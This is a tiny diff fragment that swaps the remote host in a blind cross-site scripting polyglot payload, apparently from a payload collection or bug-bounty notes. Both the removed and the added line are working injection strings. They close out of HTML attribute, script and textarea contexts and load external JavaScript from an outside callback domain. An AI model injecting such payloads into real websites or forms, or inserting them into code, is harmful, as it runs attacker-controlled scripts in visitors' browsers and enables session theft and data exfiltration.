@@ -4,5 +4,5 @@
 ```
 
 ```javascript
-'"/></script></textarea><script src=https://1.bxss.in></script>//<"
+'"/></script></textarea><script src=https://js.rip/bd></script>//<"
 ```
